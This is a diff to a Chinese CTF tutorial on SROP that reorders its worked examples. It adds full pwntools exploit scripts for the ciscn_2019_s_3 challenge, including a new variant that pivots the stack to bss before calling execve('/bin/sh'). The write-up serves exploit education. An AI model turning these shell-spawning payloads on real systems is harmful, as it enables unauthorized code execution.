@@ -2015,16 +2015,130 @@ SROP (Sigreturn Oriented Programming) 是一种非常强大 ROP 的变种，它�
     frame2.rip = syscall_ret
 ```
 
-能够正确执行，其中难点在于找到 binsh_addr，为了使得 binsh 被写在栈的一个确定的位置，我们通常要先泄露一个栈的地址：
+能够正确执行，其中难点在于找到 binsh_addr，为了使得 binsh 被写在栈的一个确定的位置，我们通常有几个方案：
 
-* 方案 1 ：动态调试得到 rsp 到泄露的栈的地址的偏移（通常本机和远端的偏移有一定差距）
-* 方案 2 ：栈迁移使 binsh 被写在一个确定的位置。
+* 方案 1 ：第一次 SROP 把栈强行迁移到固定地址的 bss 段（NO PIE）
+* 方案 2 ：先泄露栈上的某个地址，然后动态调试得到 rsp 到泄露的栈的地址的偏移（通常本机和远端的偏移有一定差距）
+* 方案 3 ：先泄露栈上的某个地址，然后栈迁移使 binsh 被写在一个确定的位置。
 
-#### 例题 1：360chunqiu2017_smallest
+#### 例题 1：ciscn_2019_s_3
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)
+
+这道题如果以 ret2libc 的思路做几乎和 jarvisoj_level3_x64 差不多，但是没有 `write_got`，所以不可行。
+
+附带了一个 `syscall`。
+
+<img width="678" height="252" alt="image" src="https://github.com/user-attachments/assets/e5122b50-4283-43c0-a9db-65719e4f46c7" />
+
+然后看一个 `gadgets()` 函数里有 `mov rax 15`，也就是 `sigreturn`。
+
+<img width="626" height="241" alt="image" src="https://github.com/user-attachments/assets/31441132-783f-41b6-a07a-c7bcb0d6d985" />
+
+`sub_4004E2()` 函数里有 `mov rax 59`，也就是 `execve`。
+
+<img width="586" height="171" alt="image" src="https://github.com/user-attachments/assets/785829cb-5ef8-4c56-b983-3803e09b31aa" />
+
+那么我们就可以用 SROP。
+
+如果我们用动态调试找一下 rsp 到泄露的栈的偏移，会发现 wsl 应该是 0x148，远端却是 0x110。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28445
+io = remote(host,port)
+# io = process("./ciscn_s_3")
+elf = ELF("./ciscn_s_3")
+vuln_addr = 0x4004ed
+syscall = 0x400517
+mov_rax_15_ret = 0x4004da
+
+payload_1 = b'/bin/sh\x00' + b'A'*8 + p64(vuln_addr)
+# 没有 pop rbp 直接 retn，所以 padding 长度为 0x10
+
+def main():
+    io.sendline(payload_1)
+    # gdb.attach(io,"b *0x400517\nc")    # vuln 函数中执行 syscall 的指令地址
+    # pause()
+    io.recv(0x20)   # payload_1 + saved_rbp
+    stack_leak = u64(io.recv(8))  # 泄露的栈上的地址
+    binsh = stack_leak - 0x118    # 本地 0x148，靶机通常在 0x110 左右
+    frame = SigreturnFrame()
+    frame.rax = 59              # sys_execve
+    frame.rdi = binsh           # 指向 /bin/sh
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = syscall         # 恢复现场后，去执行 syscall
+    payload_2 = b'/bin/sh\x00' + b'A'*8 + p64(mov_rax_15_ret) + p64(syscall) + bytes(frame)
+    io.sendline(payload_2)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+当然我们也可以把栈强行迁移到固定的 bss 段上。
+
+```
+# written by Sonnety
+from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+
+
+# io = remote("node.buuoj.cn", 12345)
+io = process("./ciscn_s_3")
+elf = ELF("./ciscn_s_3")
+bss_addr = elf.bss() + 0x500 
+
+mov_rax_15_ret = 0x4004DA   # sigreturn
+syscall_ret = 0x400517
+
+def main():
+    frame1 = SigreturnFrame()
+    frame1.rax = constants.SYS_read
+    frame1.rdi = 0
+    frame1.rsi = bss_addr
+    frame1.rdx = 0x400
+    frame1.rsp = bss_addr
+    frame1.rip = syscall_ret
+
+    payload_1 = b'A' * 0x10 + p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(frame1)
+    io.send(payload_1)
+    # 此时 rsp 指向我们设定的 bss 段    
+    io.recv(0x30)   # 程序会执行原本的 sys_write 吐出 0x30 字节垃圾数据，无视它
+    sleep(0.1)
+
+    binsh_addr = bss_addr + 0x108
+    
+    frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh_addr
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_ret
+    
+    payload_2 = p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(frame2)
+    payload_2 = payload_2.ljust(0x108, b'\x00') + b'/bin/sh\x00'
+    
+    io.send(payload_2)
+    
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+
+#### 例题 2：360chunqiu2017_smallest
 
 [BUU CTF 题目链接](https://buuoj.cn/challenges#360chunqiu2017_smallest)
 
-64位程序，只开启了NX保护，程序非常简单。
+64位程序，只开启了NX保护，程序非常简单，纯纯毛坯房，没有 bss 段。
 
 <img width="1087" height="197" alt="image" src="https://github.com/user-attachments/assets/387bd309-de16-4c44-bc64-2f026f7bdbd2" />
 
@@ -2195,59 +2309,3 @@ if __name__ == "__main__":
     main()
 ```
 
-#### 例题 2：ciscn_2019_s_3
-
-[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)
-
-这道题如果以 ret2libc 的思路做几乎和 jarvisoj_level3_x64 差不多，但是没有 `write_got`，都是 `sys_write`，并且附带了一个 `syscall`。
-
-<img width="678" height="252" alt="image" src="https://github.com/user-attachments/assets/e5122b50-4283-43c0-a9db-65719e4f46c7" />
-
-然后看一个 `gadgets()` 函数里有 `mov rax 15`，也就是 `sigreturn`。
-
-<img width="626" height="241" alt="image" src="https://github.com/user-attachments/assets/31441132-783f-41b6-a07a-c7bcb0d6d985" />
-
-`sub_4004E2()` 函数里有 `mov rax 59`，也就是 `execve`。
-
-<img width="586" height="171" alt="image" src="https://github.com/user-attachments/assets/785829cb-5ef8-4c56-b983-3803e09b31aa" />
-
-那么我们就可以用 SROP。
-
-```
-# written by Sonnety
-from pwn import *
-context(os = 'linux',arch = 'amd64',log_level = 'debug')
-
-host = "node5.buuoj.cn"
-port = 28445
-io = remote(host,port)
-# io = process("./ciscn_s_3")
-elf = ELF("./ciscn_s_3")
-vuln_addr = 0x4004ed
-syscall = 0x400517
-mov_rax_15_ret = 0x4004da
-
-payload_1 = b'/bin/sh\x00' + b'A'*8 + p64(vuln_addr)
-# 没有 pop rbp 直接 retn，所以 padding 长度为 0x10
-
-def main():
-    io.sendline(payload_1)
-    # gdb.attach(io,"b *0x400517\nc")    # vuln 函数中执行 syscall 的指令地址
-    # pause()
-    io.recv(0x20)   # payload_1 + saved_rbp
-    stack_leak = u64(io.recv(8))  # 泄露的栈上的地址
-    binsh = stack_leak - 0x118    # 本地 0x148，靶机通常在 0x110 左右
-    frame = SigreturnFrame()
-    frame.rax = 59              # sys_execve
-    frame.rdi = binsh           # 指向 /bin/sh
-    frame.rsi = 0
-    frame.rdx = 0
-    frame.rip = syscall         # 恢复现场后，去执行 syscall
-    payload_2 = b'/bin/sh\x00' + b'A'*8 + p64(mov_rax_15_ret) + p64(syscall) + bytes(frame)
-    io.sendline(payload_2)
-    io.interactive()
-
-
-if __name__ == "__main__":
-    main()
-```
